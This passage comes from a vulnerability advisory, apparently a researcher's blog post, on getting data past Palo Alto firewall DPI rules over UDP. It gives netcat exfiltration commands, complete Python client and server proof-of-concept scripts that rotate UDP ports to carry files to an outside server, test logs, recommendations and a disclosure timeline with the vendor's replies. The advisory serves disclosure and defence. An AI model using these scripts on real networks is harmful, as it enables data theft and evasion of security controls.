+Receiving a file over UDP from the client:
+
+    kali-wan-server% for i in $(seq 1 10); do nc -l -v -n -u -p 82 > exfiltration-udp-$i;sleep 1;done
+    listening on [any] 82 ...
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 49519
+    ^C
+    listening on [any] 82 ...
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 42878
+    ^C
+    listening on [any] 82 ...
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 47965
+    ^C
+    listening on [any] 82 ...
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 42639
+    ^C
+    listening on [any] 82 ...
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 52678
+    ^C
+    listening on [any] 82 ...
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 38716
+    ^C
+    listening on [any] 82 ...
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 46421
+    ^C
+    listening on [any] 82 ...
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 46280
+    ^C
+    listening on [any] 82 ...
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 42620
+    ^C
+    listening on [any] 82 ...
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 54255
+    ^C
+    kali-wan-server%
+
+The client sends random data to the remote server using port 82/udp (any random UDP port will work).
+
+Sending random data to any remote server on port 82/udp:
+
+    kali-lan-client% for i in $(seq 1 10); do cat /dev/urandom | hexdump -C | nc -v -n -u 172.16.35.3 82;sleep 2;done       
+    (UNKNOWN) [172.16.35.3] 82 (?) open
+    ^C
+    (UNKNOWN) [172.16.35.3] 82 (?) open
+    ^C
+    (UNKNOWN) [172.16.35.3] 82 (?) open
+    ^C
+    (UNKNOWN) [172.16.35.3] 82 (?) open
+    ^C
+    (UNKNOWN) [172.16.35.3] 82 (?) open
+    ^C
+    (UNKNOWN) [172.16.35.3] 82 (?) open
+    ^C
+    (UNKNOWN) [172.16.35.3] 82 (?) open
+    ^C
+    (UNKNOWN) [172.16.35.3] 82 (?) open
+    ^C
+    (UNKNOWN) [172.16.35.3] 82 (?) open
+    ^C
+    (UNKNOWN) [172.16.35.3] 82 (?) open
+    ^C
+    kali-lan-client%
+
+We can confirm that the remote server successfully received files from the client:
+
+    kali-wan-server% ls -la
+    total 316
+    drwxrwxr-x  2 user user  4096 Oct 24 11:11 .
+    drwx------ 21 user user  4096 Oct 24 11:09 ..
+    -rw-rw-r--  1 user user 32768 Oct 24 11:10 exfiltration-udp-1
+    -rw-rw-r--  1 user user 32768 Oct 24 11:11 exfiltration-udp-10
+    -rw-rw-r--  1 user user 32768 Oct 24 11:11 exfiltration-udp-2
+    -rw-rw-r--  1 user user 32768 Oct 24 11:11 exfiltration-udp-3
+    -rw-rw-r--  1 user user 32768 Oct 24 11:11 exfiltration-udp-4
+    -rw-rw-r--  1 user user 32768 Oct 24 11:11 exfiltration-udp-5
+    -rw-rw-r--  1 user user 32768 Oct 24 11:11 exfiltration-udp-6
+    -rw-rw-r--  1 user user 32768 Oct 24 11:11 exfiltration-udp-7
+    -rw-rw-r--  1 user user 32768 Oct 24 11:11 exfiltration-udp-8
+    -rw-rw-r--  1 user user 32768 Oct 24 11:11 exfiltration-udp-9
+    kali-wan-server%
+
+Content of the random data (for example, exfiltration-udp-2) - found in the Annexes.
+
+Logs showing exfiltration of data:
+
+[please use the HTML version at https://pierrekim.github.io/blog/2025-03-31-paloalto-dpi-3-vulnerabilities.html]
+
+After multiple tests, it appears that an attacker can exfiltrate files without any filtering, with UDP datagrams (64KB each) - a PoC is provided in the below section.
+
+Any port can be used. For example, port 31337/udp.
+
+Sending remote data over port 31337/udp using the previous exfiltration-udp-2 file allowing to confirm that the file is not modified in transit by the Palo Alto appliance:
+
+    kali-lan-client% ls -la exfiltration-udp-2 
+    -rw-rw-r-- 1 user user 32768 Oct 24 16:01 exfiltration-udp-2
+    kali-lan-client% sha256sum exfiltration-udp-2 
+    fd0c656bbe8fb0e4f97b319e74fc2b91c6a1137ad9dee00a6b24e224d90c5344  exfiltration-udp-2
+    kali-lan-client% nc -v -n -u 172.16.35.3 31337 < exfiltration-udp-2
+    (UNKNOWN) [172.16.35.3] 31337 (?) open
+    ^C
+    kali-lan-client% 
+
+Then, the remote server receives the file.
+
+Receiving data over port 31337/udp:
+
+    kali-wan-server% nc -l -v -n -u -p 31337 > exfiltration-udp-2
+    listening on [any] 31337 ...
+    connect to [172.16.35.3] from (UNKNOWN) [192.168.1.2] 37049
+    ^C
+    kali-wan-server% ls -la exfiltration-udp-2
+    -rw-rw-r-- 1 user user 32768 Oct 24 16:03 exfiltration-udp-2
+    kali-wan-server% sha256sum exfiltration-udp-2
+    fd0c656bbe8fb0e4f97b319e74fc2b91c6a1137ad9dee00a6b24e224d90c5344  exfiltration-udp-2
+    kali-wan-server% 
+
+The checksum matches, indicating that the file was successfully exfiltrated.
+
+It was determined that exfiltration is due to dependencies of applications.
+
+For example, the `ms-office365` application will import several dependencies that will enable data exfiltration:
+
+Dependencies automatically added:
+
+[please use the HTML version at https://pierrekim.github.io/blog/2025-03-31-paloalto-dpi-3-vulnerabilities.html]
+
+The traffic is detected as it is related to the `access-to-office` firewall rule, with incorrect amounts of exfiltrated data detected in the logs.
+
+[please use the HTML version at https://pierrekim.github.io/blog/2025-03-31-paloalto-dpi-3-vulnerabilities.html]
+
+### PoC
+
+A complete PoC is provided, allowing to exfiltrate any amount of data:
+
+`client.py` - will send a file over UDP datagrams and switch to a new UDP port after sending 4 datagrams:
+
+    kali-lan-client% ./client.py -h                             
+    usage: client.py [-h] -f FILE -ip IP [-p PORT] [-c CHUNKSIZE] [-n PORTNUMBER] [-s SLEEP]
+    
+    options:
+      -h, --help            show this help message and exit
+      -f FILE, --file FILE  file
+      -ip IP                ip
+      -p PORT, --port PORT  beginning port (default 31337)
+      -c CHUNKSIZE, --chunksize CHUNKSIZE
+                            chunk size (default 7000)
+      -n PORTNUMBER, --portnumber PORTNUMBER
+                            default port (default 1000)
+      -s SLEEP, --sleep SLEEP
+                            default sleep before using a new port (default 0)
+    kali-lan-client%
+
+[code:python]
+#!/usr/bin/python
+
+import socket, sys, time, argparse
+
+def createsocket():
+  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+  return sock
+
+def exfiltrate(port):
+  f = open(file, "r")
+
+  while True:
+    s = createsocket()
+    for i in range (0, 4):
+      data = f.read(chunk_size)
+      s.sendto(data.encode("utf-8"), (ip, port))
+    s.close()
+    port = port + 1
+    time.sleep(sleep)
+    if port > args.port + args.portnumber:
+      break
+  time.sleep(3)
+
+if __name__ == "__main__":
+  parser = argparse.ArgumentParser()
+  parser.add_argument("-f", "--file", type=str, help="file", required=True)
+  parser.add_argument("-ip", type=str, help="ip", required=True)
+  parser.add_argument("-p", "--port", type=int, help="beginning port (default 31337)", default=31337)
+  parser.add_argument("-c", "--chunksize", type=int, help="chunk size (default 7000)", default=7000)
+  parser.add_argument("-n", "--portnumber", type=int, help="default port (default 1000)", default=1000)
+  parser.add_argument("-s", "--sleep", type=float, help="default sleep before using a new port (default 0)", default=0)
+  args = parser.parse_args()
+  file = args.file
+  ip = args.ip
+  port = args.port
+  port_nb = args.portnumber
+  chunk_size = args.chunksize
+  sleep = args.sleep
+  print("file =", file)
+  print("ip =", ip)
+  print("port =", port)
+  print("portnumber =", port_nb)
+  print("chunksize =", chunk_size)
+  print("sleep =", sleep)
+
+  exfiltrate(port)
+  print ("done")
+
+[/code]
+
+`server.py` - will create 1000 threads to listen on 1000 UDP ports and retrieve contents sent by the client. The data received will be stored on files whose names correspond to the udp port:
+
+    kali-wan-server# ulimit -n 100000 && ./server.py -h
+    usage: server.py [-h] [-p PORT] [-c CHUNKSIZE] [-n PORTNUMBER]
+    
+    options:
+      -h, --help            show this help message and exit
+      -p PORT, --port PORT  beginning port (default 31337)
+      -c CHUNKSIZE, --chunksize CHUNKSIZE
+                            chunk size (default 7000)
+      -n PORTNUMBER, --portnumber PORTNUMBER
+                            default port (default 1000)
+    kali-wan-server# ulimit -n 100000 && ./server.py   
+    port = 31337
+    portnumber = 1000
+    chunksize = 7000
+ 
+[code:python]
+#!/usr/bin/python
+
+import socket, threading, os, sys, argparse
+
+UDP_IP = "0.0.0.0"
+
+def createsocket(port):
+  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+  sock.bind((UDP_IP, port))
+  return sock
+
+def thread_recv(port):
+  s = createsocket(port)
+  f = open(str(port), "a")
+  while True:
+    data, b = s.recvfrom(chunk_size)
+    print (port, end=" ")
+    f.write(data.decode("utf-8"))
+    os.fsync(f)
+
+if __name__ == "__main__":
+  parser = argparse.ArgumentParser()
+  parser.add_argument("-p", "--port", type=int, help="beginning port (default 31337)", default=31337)
+  parser.add_argument("-c", "--chunksize", type=int, help="chunk size (default 7000)", default=7000)
+  parser.add_argument("-n", "--portnumber", type=int, help="default port (default 1000)", default=1000)
+  args = parser.parse_args()
+  port = args.port
+  port_nb = args.portnumber
+  chunk_size = args.chunksize
+  print("port =", port)
+  print("portnumber =", port_nb)
+  print("chunksize =", chunk_size)
+
+  threads = list()
+  for index in range (port, port+port_nb):
+    t = threading.Thread(target=thread_recv, args=(index,))
+    threads.append(t)
+    t.start()
+  for index, thread in enumerate(threads):
+    thread.join()
+
+[/code]
+
+For example, in my test network, with restrictive policies:
+
+- - `unknown-tcp` and `unknown-udp` (with the service `application-default`) are blocked,
+- - only `ms-office356` (with the service `application-default`) is allowed, and
+- - everything else is blocked.
+
+[please use the HTML version at https://pierrekim.github.io/blog/2025-03-31-paloalto-dpi-3-vulnerabilities.html]
+
+[please use the HTML version at https://pierrekim.github.io/blog/2025-03-31-paloalto-dpi-3-vulnerabilities.html]
+
+I generate a 10M file on `kali-lan-client` located in the LAN side of the Palo Alto appliance.
+
+This file contains the `hexdump -C` representation of 2M of random data, resulting in a 10MB file. It also appears that data represented as hexadecimal dump easily goes through Palo Alto's DPI engines.
+
+The SHA256 checksum of the file is `74a446b153955ce46fe3f8a0f30ab939226ec176af5ecaecc0cfa9f91108f725`:
+
+    kali-lan-client% ls -la
+    total 12
+    drwx------  2 user user 4096 Oct 12 21:10 .
+    drwx------ 17 user user 4096 Oct 12 21:04 ..
+    -rwx------  1 user user 1459 Oct 12 21:03 client.py
+    kali-lan-client% dd if=/dev/urandom bs=1M count=2 | hexdump -C > 10M
+    2+0 records in
+    2+0 records out
+    2097152 bytes (2.1 MB, 2.0 MiB) copied, 0.458256 s, 4.6 MB/s
+    kali-lan-client% ls -la
+    total 10128
+    drwxrwxr-x  2 user user     4096 Oct 12 21:10 .
+    drwx------ 17 user user     4096 Oct 12 21:04 ..
+    -rw-------  1 user user 10354697 Oct 12 21:10 10M
+    -rwx------  1 user user     1459 Oct 12 21:03 client.py
+    kali-lan-client% du -h 10M 
+    9.9M	10M
+    kali-lan-client% head -n 5 10M
+    00000000  87 f1 fc ba c6 15 4e 41  b0 dc 12 57 e7 31 e2 8a  |......NA...W.1..|
+    00000010  00 52 68 ad 6c 7b db 5c  c5 09 8d 40 79 48 30 f0  |.Rh.l{.\...@yH0.|
+    00000020  99 b8 db af cb cb af 5d  9e f2 bf 78 d2 b7 19 7e  |.......]...x...~|
+    00000030  11 89 fc 37 e5 20 a0 d8  c3 74 ed 1b ea fa 5f b5  |...7. ...t...._.|
+    00000040  82 5d be 39 63 a1 7d f1  f8 af 1f ed 72 02 23 50  |.].9c.}.....r.#P|
+    kali-lan-client% sha256sum 10M
+    74a446b153955ce46fe3f8a0f30ab939226ec176af5ecaecc0cfa9f91108f725  10M
+    kali-lan-client% ./client.py -f 10M -ip 172.16.35.3 -c 65000
+    file = 10M
+    ip = 172.16.35.3
+    port = 31337
+    portnumber = 1000
+    chunksize = 65000
+    sleep = 0
+    done
+    kali-lan-client% 
+
+On the server `kali-wan-server` located in the WAN side of the Palo Alto appliance, this file is received into multiple small parts. When reassembled, the resulting file has the correct SHA256 checksum `74a446b153955ce46fe3f8a0f30ab939226ec176af5ecaecc0cfa9f91108f725` meaning exfiltration was a success:
+
+    kali-wan-server# ls -la
+    total 32
+    drwxr-xr-x  2 root root 24576 Oct 12 21:08 .
+    drwx------ 24 user user  4096 Oct 12 21:07 ..
+    -rwx------  1 root root  1201 Oct 12 20:56 server.py
+    kali-wan-server# ulimit -n 100000 && ./server.py -c 65000
+    port =  31337
+    portnumber =  1000
+    chunksize =  65000
+    31337 31337 31337 31337 31338 31338 31338 31338 31339 31339 31339 31339 31340 31340 [...]
+
+    KeyboardInterrupt
+    ^C Exception ignored in: <module 'threading' from '/usr/lib/python3.11/threading.py'>
+    Traceback (most recent call last):
+      File "/usr/lib/python3.11/threading.py", line 1590, in _shutdown
+        lock.acquire()
+    KeyboardInterrupt:
+    kali-wan-server# ls -la
+    total 10228
+    drwx------  2 root root  24576 Oct 12 21:11 .
+    drwx------ 24 user user   4096 Oct 12 21:07 ..
+    -rw-------  1 root root 260000 Oct 12 21:11 31337
+    -rw-------  1 root root 260000 Oct 12 21:11 31338
+    -rw-------  1 root root 260000 Oct 12 21:11 31339
+    -rw-------  1 root root 260000 Oct 12 21:11 31340
+    -rw-------  1 root root 260000 Oct 12 21:11 31341
+    -rw-------  1 root root 260000 Oct 12 21:11 31342
+    -rw-------  1 root root 260000 Oct 12 21:11 31343
+    -rw-------  1 root root 260000 Oct 12 21:11 31344
+    [...]
+    -rw-------  1 root root      0 Oct 12 21:11 32332
+    -rw-------  1 root root      0 Oct 12 21:11 32333
+    -rw-------  1 root root      0 Oct 12 21:11 32334
+    -rw-------  1 root root      0 Oct 12 21:11 32335
+    -rw-------  1 root root      0 Oct 12 21:11 32336
+    -rwx------  1 root root   1201 Oct 12 20:56 server.py
+    kali-wan-server# cat 3* > 10M_exfiltrated
+    kali-wan-server# sha256sum 10M_exfiltrated
+    74a446b153955ce46fe3f8a0f30ab939226ec176af5ecaecc0cfa9f91108f725  10M_exfiltrated
+    kali-wan-server#
+
+In the logs, we can see that the datagrams went through.
+
+The following screenshot shows that 260,2k byte-sized communications were allowed for the UDP ports used by the PoC (because the chunk size was 65000 during the test, using `-c 65000`: 4 datagrams of 65000 = 260000 bytes = 253,9 kbytes and I guess that the additional 6440 bytes correspond to the header overheads since the datagrams were fragmented):
+
+[please use the HTML version at https://pierrekim.github.io/blog/2025-03-31-paloalto-dpi-3-vulnerabilities.html]
+
+[please use the HTML version at https://pierrekim.github.io/blog/2025-03-31-paloalto-dpi-3-vulnerabilities.html]
+
+And the latest communications (with 240 bytes detected by the appliance) were also allowed - the file was already fully transferred:
+
+[please use the HTML version at https://pierrekim.github.io/blog/2025-03-31-paloalto-dpi-3-vulnerabilities.html]
+
+[please use the HTML version at https://pierrekim.github.io/blog/2025-03-31-paloalto-dpi-3-vulnerabilities.html]
+
+Using Wireshark on the receiving server, we can see that UDP datagrams were fragmented:
+
+[please use the HTML version at https://pierrekim.github.io/blog/2025-03-31-paloalto-dpi-3-vulnerabilities.html]
+
+[please use the HTML version at https://pierrekim.github.io/blog/2025-03-31-paloalto-dpi-3-vulnerabilities.html]
+
+I ran some tests with bigger files (200MB) and achieved the speed of 600Mbps of data exfiltrated on the remote server (likely limited by the test hardware) with a datagram size of 65,000 bytes (and a MTU of 1,500 bytes).
+
+    kali-wan-server% slurm -i eth0
+                          -= slurm 0.4.4 on kali-wan-server =-
+    
+                                                                              x    
+     x                                 xxxx       x  xx                 x  xxxx    
+     xx                                xxxxx     xxxxxx               xxxxxxxxx    
+     xx                           xx  xxxxxx    xxxxxxx               xxxxxxxxx    
+     xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx    
+     xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx    
+                                              x x x                   x  xx        
+                                                  x                       x        
+                                                  x                       x        
+                                                                          x
+    
+    
+    
+          Active Interface: eth0                    Interface Speed: 1000 Mbit/s
+    
+          Current RX Speed: 70271.63 KB/s          Current TX Speed: 9.42 KB/s       
+        Graph Top RX Speed: 74681.16 KB/s        Graph Top TX Speed: 20.85 KB/s      
+      Overall Top RX Speed: 74681.16 KB/s      Overall Top TX Speed: 20.85 KB/s      
+          Received Packets: 6769372             Transmitted Packets: 348814          
+           GBytes Received: 9.015 GB             GBytes Transmitted: 0.312 GB        
+       Errors on Receiving:   0              Errors on Transmission: 0
+
+
+Obviously, using UDP datagrams with a size of 65,000 bytes is not possible on the Internet because they will be fragmented into a multitude of small packets and such datagram size is likely to be dropped by routers. From my tests, over the Internet, datagrams with a size of 7,000 bytes usually go through with a speed of ~ 100Mbps without limits. It appears that some hosting companies will drop UDP floods. Therefore, I added the `--sleep` option in the `client.py` PoC to wait milliseconds before switching to a new UDP port.
+
+With a 15MB file sent over the Internet (a sleep of 10ms is used when switching to a new UDP port, artificialy limiting the throughput):
+
+    kali% ls -la
+    total 4
+    drwxr-xr-x  2 root root   60 Feb 13 10:04 .
+    drwxrwxrwt 26 root root 1660 Feb 13 09:10 ..
+    -rwx------  1 root root 1465 Feb 13 10:03 client.py
+    kali% dd if=/dev/urandom bs=1M count=3 | hexdump -C > 15M
+    3+0 records in
+    3+0 records out
+    3145728 bytes (3.1 MB, 3.0 MiB) copied, 0.625271 s, 5.0 MB/s
+    kali% ls -la
+    total 15176
+    drwxr-xr-x  2 root root       80 Feb 13 10:04 .
+    drwxrwxrwt 26 root root     1660 Feb 13 09:10 ..
+    -rw-------  1 root root 15532041 Feb 13 10:04 15M
+    -rwx------  1 root root     1465 Feb 13 10:03 client.py
+    kali% du -h 15M
+    15M	15M
+    kali% sha256sum 15M
+    2463d436d3bf720091a6d18138b308ba9e7c41aab42ed76639dc3cc17387c7b4  15M
+    kali% ./client.py -f 15M -ip [redacted] -c 7000 -p 30000 -s 0.01
+    file = 15M
+    ip = [redacted]
+    port = 30000
+    portnumber = 1000
+    chunksize = 7000
+    sleep = 0.01
+    done
+    kali% 
+
+On the remote server, the file is received:
+
+    server# ulimit -n 100000 && ./server.py -c 7000 -p 30000 -n 1000
+    port =  30000
+    portnumber =  1000
+    chunksize =  7000
+    30000 30000 30000 30000 30001 30001 30001 30001 30002 30002 30002 30002 30003 30003 30003 30003 30004 30004 30004 30004 30005 30005 30005 30005 30006 30006 30006 30006 30007 30007 30007 30007 30008 30008 30008 30008 30009 30009 30009 30009 30010 30010 30010 30010 30011 30011 30011 30011 30012 30012 30012 30012 30013 30013 30013 30013 30014 30014 30014 30014 30015 30015 30015 30015 30016 30016 30016 30016 30017 30017 30017 30017 30018 30018 30018 30018 30019 30019 30019 30019 30020 30020 30020 30020 30021 30021 30021 30021 30022 30022 30022 30022 30023 30023 30023 30023 30024 30024 30024 30024 30025 30025 30025 30025 30026 30026 30026 30026 30027 30027 30027 30027 30028 30028 30028 30028 30029 30029 30029 30029 30030 30030 30030 30030 30031 30031 30031 30031 30032 30032 30032 30032 30033 30033 30033 30033 30034 30034 30034 30034 30035 30035 30035 30035 30036 30036 30036 [...]
+    ^C
+    server# du -h
+    15M	.
+    server# ls -la | head
+    total 13316
+    drwx------ 2 root root 20060 Feb 13 18:09 .
+    drwxrwxrwt 3 root root    60 Feb 13 17:38 ..
+    -rw------- 1 root root 21000 Feb 13 18:09 30000
+    -rw------- 1 root root 21000 Feb 13 18:09 30001
+    -rw------- 1 root root 21000 Feb 13 18:09 30002
+    -rw------- 1 root root 21000 Feb 13 18:09 30003
+    -rw------- 1 root root 21000 Feb 13 18:09 30004
+    -rw------- 1 root root 21000 Feb 13 18:09 30005
+    -rw------- 1 root root 21000 Feb 13 18:09 30006
+    server# cat 3*|sha256sum 
+    2463d436d3bf720091a6d18138b308ba9e7c41aab42ed76639dc3cc17387c7b4  -
+    server# 
+
+With tcpdump, we can confirm that the file is being transferred over UDP:
+
+    server# tcpdump -n -i eth0 udp
+    [...]
+    18:09:53.814557 IP [redacted]2 > [redacted]: ip-proto-17
+    18:09:53.814558 IP [redacted] > [redacted]: ip-proto-17
+    18:09:53.814558 IP [redacted] > [redacted]: ip-proto-17
+    18:09:53.814558 IP [redacted] > [redacted]: ip-proto-17
+    18:09:53.814558 IP [redacted] > [redacted]: ip-proto-17
+    18:09:53.814558 IP [redacted] > [redacted]: ip-proto-17
+    18:09:53.814558 IP [redacted] > [redacted]: ip-proto-17
+    18:09:53.814558 IP [redacted] > [redacted]: ip-proto-17
+    18:09:53.814600 IP [redacted] > [redacted]: ip-proto-17
+    18:09:53.814600 IP [redacted] > [redacted]: ip-proto-17
+    18:09:53.814600 IP [redacted] > [redacted]: ip-proto-17
+    18:09:53.814600 IP [redacted] > [redacted]: ip-proto-17
+    18:09:53.814600 IP [redacted] > [redacted]: ip-proto-17
+    18:09:53.814600 IP [redacted] > [redacted]: ip-proto-17
+    18:09:53.814600 IP [redacted] > [redacted]: ip-proto-17
+    18:09:53.814600 IP [redacted] > [redacted]: ip-proto-17
+    18:09:53.814855 IP [redacted].60614 > [redacted].30071: UDP, length 7000
+    18:09:53.814855 IP [redacted].60614 > [redacted].30071: UDP, length 7000
+    18:09:53.814855 IP [redacted].60614 > [redacted].30071: UDP, length 7000
+    18:09:53.814855 IP [redacted].60614 > [redacted].30071: UDP, length 7000
+    18:09:53.825361 IP [redacted] > [redacted]: ip-proto-17
+    18:09:53.825361 IP [redacted] > [redacted]: ip-proto-17
+    18:09:53.825362 IP [redacted] > [redacted]: ip-proto-17
+    18:09:53.825362 IP [redacted] > [redacted]: ip-proto-17
+    18:09:53.825390 IP [redacted] > [redacted]: ip-proto-17
+    18:09:53.825390 IP [redacted] > [redacted]: ip-proto-17
+    [...]
+
+During this transfer, I saw a 20Mbps speed due to the use of a sleep of 10ms when switching to a new UDP port:
+
+    server% slurm -i eth0
+                               -= slurm 0.4.3 on server =-
+    
+     x                                                                             
+     xxxx                                                                          
+     xxxx                                                                          
+     xxxxx                                                                         
+     xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx               
+     xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx               
+     x                                                      x x                    
+     x                                                                             
+     x                                                                             
+     x                                                                             
+    
+    
+    
+          Active Interface: eth0                    Interface Speed: unknown
+    
+          Current RX Speed: 2580.04 KB/s           Current TX Speed: 10.32 KB/s      
+        Graph Top RX Speed: 2580.04 KB/s         Graph Top TX Speed: 10.32 KB/s      
+      Overall Top RX Speed: 2580.04 KB/s       Overall Top TX Speed: 10.32 KB/s      
+          Received Packets: 205380              Transmitted Packets: 30023           
+           MBytes Received: 243.647 MB           MBytes Transmitted: 10.926 MB       
+       Errors on Receiving: 0                Errors on Transmission: 0               
+    
+    
+    
+
+Without a sleep of 10ms when a new UDP port is used, I saw a speed of 10518KB/s speed (~ 84Mbps). However, some packets will be missing on the receiving server.
+
+                           -= slurm 0.4.4 on server =-
+    
+                 x                                                                 
+                 x                                            x                    
+                 x                                            x                    
+                 x             x                              x                    
+     xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
+     xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
+                        x                             x                            
+                        x                             x                            
+                        x                             x                            
+                        x                                                          
+    
+    
+    
+          Active Interface: eth0                    Interface Speed: 1000 Mbit/s
+    
+          Current RX Speed: 0.12 KB/s              Current TX Speed: 0.47 KB/s       
+        Graph Top RX Speed: 10518.66 KB/s        Graph Top TX Speed: 58.17 KB/s      
+      Overall Top RX Speed: 10518.66 KB/s      Overall Top TX Speed: 58.17 KB/s      
+          Received Packets: 9678138             Transmitted Packets: 354087          
+           GBytes Received: 13.049 GB            GBytes Transmitted: 0.313 GB        
+       Errors on Receiving: 0                Errors on Transmission: 0               
+
+Note that, because UDP is used, it happens that datagrams are lost (in a LAN, I receive between 99.999% and 100% of the datagrams), but the results may differ on the Internet. The use of a timer (10ms, 5ms) when switching UDP ports will strongly limit packet loss.
+
+- From my tests, it is possible to exfiltrate a huge quantity of data.
+
+Finally, regarding the choice of using a hexadecimal version of files: representation with `hexdump -C` was used to identify potential missing/blocked transferred data during the tests. The fact that UDP also may arrive in different order is partially solved using hexdump representation (thanks to the address of the content). Also, surprisingly, hexadecimal-encoded data tends to pass very easily through DPI engines of Palo Alto:
+
+    kali-lan-client% head -n 10 25M
+    00000000  df ac e4 18 02 be 72 dd  1b 80 d2 19 24 fa 10 25  |......r.....$..%|
+    00000010  b7 b7 ae 98 45 d4 3f d9  21 27 7f 5e a6 e7 09 1f  |....E.?.!'.^....|
+    00000020  10 28 af a7 1f 4b 43 2d  2e 17 dd d9 11 9b d5 3e  |.(...KC-.......>|
+    00000030  dc d2 a7 5d 4b eb 83 05  b0 ea 73 48 61 1d ac 56  |...]K.....sHa..V|
+    00000040  a7 c3 56 83 da 0f b1 57  4f de 39 30 96 e6 bd 21  |..V....WO.90...!|
+    00000050  a9 84 f3 01 80 8a b3 0f  66 11 2b d5 7e 94 7a 07  |........f.+.~.z.|
+    00000060  f8 11 ba 5a 16 e9 7c b7  90 83 28 3f 85 e5 22 ff  |...Z..|...(?..".|
+    00000070  da 41 af 63 fc 6f af 63  ed d2 ab c6 21 c2 54 8b  |.A.c.o.c....!.T.|
+    00000080  98 fd e7 dd 10 75 ba a2  28 56 c7 40 a4 ba 6d ee  |.....u..(V.@..m.|
+    00000090  25 3c 83 5c 5f 80 a0 47  66 7c d2 e8 96 03 a4 be  |%<.\_..Gf|......|
+
+### Risk                    
+
+Threat actors can exfiltrate data without any filtering.
+
+### Recommendation
+
+There are vulnerabilities inside the `default-application` service in Palo Alto firewalls when using a specific application (Palo Alto wording for available Deep Packet Inspection mechanisms), allowing an attacker to transmit any data to the Internet. The application linked to the `default-application` service provides information to the Deep Packet Inspection (DPI) mechanisms implemented in the `default-application` service to block any unwanted traffic.
+
+Any rule based on the `default-application` service (e.g. access to websites) with a specific application without a destination address is vulnerable to data exfiltration.
+
+Do not use DPI-based rules.
+
+In the firewall rules, always specify the IPv4 and IPv6 addresses of the remote services that you want to allow.
+
+
+
+## Report Timeline
+
+* 2023 - 2024: Reported several HTTP/HTTPS DPI bypasses to the Palo Alto support (different from those indicated in this security advisory). On September 2024, the support finally provided me with workarounds with 10 options in "Suspicious HTTP Evasion Detection" and "Suspicious TLS Evasion Found" to set to drop in order to block these bypasses.
+* Oct 2024: Security assessment performed on "standard" DPI firewall rules implemented on Palo Alto PanOS.
+* Nov 4, 2024: Sent a complete report to Palo Alto PSIRT.
+* Nov 7, 2024: Asked for an update.
+* Nov 14, 2024: Palo Alto PSIRT acknowledged the reception of the security assessment and confirmed that the behavior is normal due to "insufficient-data" (as shown in the screenshots found in the report), and provided me with links to the palo alto website and the following explanation:
+
+> The behavior described in the report is not considered a vulnerability, since it does not impact the confidentiality, integrity, or availability of the system or downstream systems, and therefore it does not meet the criteria to assign a CVE. There are multiple proactive measures that are available to reduce the likelihood of exfiltration. These include: 
+
+> - creating security policies that specify both the source and destination IP addresses in the policy, including the use of EDLs for SaaS type services,
+
+> - using auto-tagging to tag source IPs with insufficient-data/unknown sessions, which can then be added to a dynamic access group for use in a policy, such as an authentication policy,
+
+> - using authentication policies as additional barriers to malicious activity, and
+
+> - configuring DNS Sinkholing for suspicious domains.
+
+* Nov 15, 2024: Asked clarification regarding the allowed amount of exfiltrated data, since the official documentation (https://knowledgebase.paloaltonetworks.com/KCSArticleDetail?id=kA10g000000ClIgCAK) indicates that the appliance will "Wait for a maximum of 4 packets or 2000 bytes of data in either direction (not including the TCP handshake)". I confirmed from my observation that, I was able to exfiltrate more data in UDP and in TCP. I asked if they replicated the tests.
+* Nov 25, 2024: Sent a follow-up email.
+* Nov 26, 2024: Palo Alto provided the same 4 previous workarounds and said I should recontact them after trying these mitigations.
+* Dec 6, 2024: I confirmed to Palo Alto PSIRT that the 4 workarounds they previously indicated do not work: tcp packets and udp datagrams are not blocked even with denied unknown-tcp and unknown-udp denied policy at the top of the rules - I was able to exfiltrate up to 40KBs in TCP and UDP in 1 network flow. I again asked if they tested the PoCs. I also said that these vulnerabilities may be elligible to CVEs. If network flows are not blocked by the firewall while they were supposed to be blocked, this looks like a vulnerability. We can find previous CVEs corresponding to firewalls letting packets through, for example CVE-2019-5598.
+* Dec 9, 2024: Palo Alto PSIRT said they would forward the report to the product team.
+* Jan 13, 2025: Asked for an update.
+* Jan 15, 2025: Palo Alto PSIRT provided me with the final analysis.
+* Feb 11, 2025: I asked Palo Alto PSIRT more details regarding the official analysis.
+* Mar 13, 2025: Palo Alto PSIRT provided me with the official statement:
+
+> Reports 1 & 2:
+> Our firewall is designed to optimize user experience and minimize disruption. If the firewall encounters HTTP traffic it cannot confidently identify (e.g., Facebook, Reddit), the request is not automatically dropped to avoid false positives and unintended performance issues.
+> 
+> If you'd like to explore an option to drop unidentified traffic, you're welcome to submit a feature request through our support team: https://support.paloaltonetworks.com.
+> 
+> Report 3:
+> The firewall requires a certain number of packets for inspection before setting the App-ID to unknown-udp. For rules involving apps with udp/dynamic as their default, the firewall waits until an App-ID is determined before taking action. In this case, the UDP packet count fell below the threshold, so the App-ID remained insufficient-data, and the session was not dropped.
+> 
+> If you'd like the flexibility to adjust this packet threshold, you can submit a feature request through our support team: https://support.paloaltonetworks.com.
+> 
+> Security Classification:
